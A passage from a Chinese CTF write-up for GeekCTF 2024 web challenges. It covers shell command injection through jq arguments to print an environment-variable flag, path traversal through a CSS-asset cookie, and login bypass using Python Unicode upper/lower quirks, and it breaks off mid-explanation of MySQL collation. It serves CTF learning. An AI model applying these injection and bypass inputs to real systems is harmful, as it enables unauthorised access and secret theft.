operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013f</span><span class="token plain">b </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c1        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013f</span><span class="token plain">e </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">b </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_158</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            b0 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">00101405</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c7        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">00101408</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c2     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0010140</span><span class="token plain">c </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 c0        MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0010140f</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_150</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            b8 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">00101416</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c6     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0010141</span><span class="token plain">a </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c2        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0010141</span><span class="token plain">d </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">b </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_150</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            b8 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">00101424</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c6        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">00101427</span><span class="token plain"> c7 </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">84</span><span class="token plain">        MOV        dword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_184</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            fe ff ff </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" style="color:#36acaa">00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">00</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>web出题人writeup: <a href="https://www.ff98sha.me/archives/543" target="_blank" rel="noopener noreferrer">https://www.ff98sha.me/archives/543</a>，<a href="https://blog.hans362.cn/post/sjtu-ctf-geekctf-2024-writeup/" target="_blank" rel="noopener noreferrer">https://blog.hans362.cn/post/sjtu-ctf-geekctf-2024-writeup/</a>
评价为CVE调研/信息获取能力太差，Wordpress题，NextGPT题都是很明显的已知CVE，但是没查出来</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---yajf">web - YAJF<a href="#web---yajf" class="hash-link" aria-label="web - YAJF的直接链接" title="web - YAJF的直接链接">​</a></h2>
<p>看起来是web题，实际上是bash shell escape。</p>
<p>这个题前端界面给了一个可以prettify json的小程序，题干说明了是<code>jq</code>。网站的API非常简单粗暴，可以用json参数传一个json文件，然后可以用很多个<code>args</code>参数传<code>jq</code>的命令行参数。json文件本身估计会被写入文件，利用可能不大了；但命令行参数可是实打实会被传进shell里，并且以空格分隔，所以过滤不严十有八九会RCE。这里提个小细节，因为此题需要传多个相同key的dict，我们可以用werkzeug安装时附带的multidict模块。</p>
<p>经过测试，发现几个特征。</p>
<ul>
<li>args最大长度为5，除此外没发现WAF</li>
<li>输出必须是合法的JSON格式，否则不会返回</li>
</ul>
<p>首先我们用<code>;</code>把命令截断。然后，因为题干给出flag在环境变量里，我们首先想到<code>env | grep flag</code>可以输出flag内容。但是我们需要把它弄成一个合法json。其实是要解决两件事：</p>
<ul>
<li>grep本身会多输出一个换行符，不过如果用<code>$()</code>包起来就没事了，<code>echo -n $( env | grep flag )</code></li>
<li>补一个字符串头尾，这个简单：<code>echo -n [\&quot;;</code>，<code>echo -n \&quot;];</code></li>
</ul>
<p>这样最终会输出：<code>[&quot;FLAG=flag{rC3_1S_5o_eEEe@sY_hHhhHHH}&quot;]</code>，结束。不过感觉还是不够劲啊，如果FLAG里面来点引号括号啥的估计能更好玩一点（</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---secrets">web - secrets<a href="#web---secrets" class="hash-link" aria-label="web - secrets的直接链接" title="web - secrets的直接链接">​</a></h2>
<p>这个题我也很喜欢，虽然分了三个阶段，但后两  个阶段其实都在讲一个事情：当<code>upper/lower</code>字符串转换遇到非标准字符集时会发生什么。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="1-源码泄露">1. 源码泄露<a href="#1-源码泄露" class="hash-link" aria-label="1. 源码泄露的直接链接" title="1. 源码泄露的直接链接">​</a></h4>
<p>当然首先我就被一个登陆页面给拦住了，尝试了一些SQL注入自然没什么结果。不过这个页面有些很奇怪的点：</p>
<ul>
<li>有一个selectbox可以设置主题，切换不同的CSS。不过这题设置主题的方式有点特别，会设置一个类似<code>assets=assets/css/pico.violet.min.css</code>的cookie，然后通过<code>/redirectCustomAsset</code>的endpoint获得CSS。</li>
<li>网站上有两个hint，一个是HTML的注释，有一堆乱码，可以用Base85解码，得到的是网站的目录结构。还有一个是网页端控制台会输出一个数字列表，可以看出是在<code>color-picker.js</code>开头用<code>console.log</code>硬编码输出的，很明显是些信息。一开始我没看出来，问了Claude才意识到这些数字里只包含0-7，所以用八进制解码，得到一句话：<code>Don&#x27;t you think the color picker is weird?</code></li>
</ul>
<p>哎呀我当然知道这个CSS有点奇怪。一阵fuzz后我发现，把<code>assets</code>cookie设置为<code>assets/css/../css/pico.violet.min.css</code>时，能正常设置；但<code>assets/../css/pico.violet.min.css</code>，看来这个CSS是简单的前缀匹配，可以绕过的。通过之前Base85的目录结构，我们可以泄露所有的源码文件，正式进入第二阶段。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="2-normal-user-loginpython-unicode-upper-lower-degeneracy">2. Normal User login：Python Unicode .upper .lower degeneracy<a href="#2-normal-user-loginpython-unicode-upper-lower-degeneracy" class="hash-link" aria-label="2. Normal User login：Python Unicode .upper .lower degeneracy的直接链接" title="2. Normal User login：Python Unicode .upper .lower degeneracy的直接链接">​</a></h4>
<p>我一开始在源码里找到了普通用户的明文登录账号密码还挺高兴，但发现登不进去。仔细一看才发现，这个密码验证算法好像有点特别：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">upper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">upper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;alice&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">password</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;start2024&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    session</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;logged_in&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    session</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;role&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;user&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> redirect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">elif</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">urandom</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    session</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;logged_in&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    session</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;role&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;admin&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> redirect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>好家伙，小写不相等，大写相等？这个设计应该是本来为了方便其他拉丁语种用户使用大小写功能的，但是确实会造成一些意想不到的绕过现象的，听说过Javascript那边确实有用这种现象攻击的案例，没想到Python也有。
于是，简单写了个Python代码，遍历所有Unicode字符，看看哪些出现了这种情况</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">upper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">upper</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> c </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x10ffff</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">any</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> al</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> al </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x61</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">26</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">al </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> al </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x61</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">26</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> isEqual</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> al</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">305 ı i</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">383 ſ s</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>很神奇啊，不止有，还有两个，刚好用来bypass用户名和密码。关于前者，我还看到了<a href="https://stackoverflow.com/questions/19030948/python-utf-8-lowercase-turkish-specific-letter" target="_blank" rel="noopener noreferrer">stackoverflow</a>有土耳其人吐槽为什么Python2.7的<code>tolower</code>不能返回土耳其文字中的<code>ı</code>。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="3-admin-user-login-sql-unicode-ci">3. Admin User Login: SQL Unicode CI<a href="#3-admin-user-login-sql-unicode-ci" class="hash-link" aria-label="3. Admin User Login: SQL Unicode CI的直接链接" title="3. Admin User Login: SQL Unicode CI的直接链接">​</a></h4>
<p>第三阶段是登录之后，我们可以传入一个<code>type</code>URL参数，通过SQLAlchemy向服务器请求内容。我们的flag在名为<code>secrets</code>的行中，但如果前端flask会检查<code>type</code>在Python中lower或upper之后返回了<code>secrets</code>，就不会像数据库请求而是返回一个报错页面。这个报错页面长这样：<code>You are not admin. Only admin can view secre&lt;u&gt;ts&lt;/u&gt;</code>，很讲究啊，用一个下划线把最后两个字母<code>ts</code>给标出来了。</p>
<p>源码给出了数据库的编码格式为<code>utf8mb4</code>, 还有一个排序规则（collation）为<code>utf8mb4_unicode_ci</code>。查了<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html" target="_blank" rel="noopener noreferrer">MySQL的文档</a>，其实<code>utf8mb4</code>就是最大四字节的UTF8，就是一般意义下的UTF8（和Python一样的）。而<code>_unicode_ci</code>则比较有趣，它主要是为了让其他语言的非标准字符在排序比较时能和相似的标准字符有相同的地位，比如：</p>
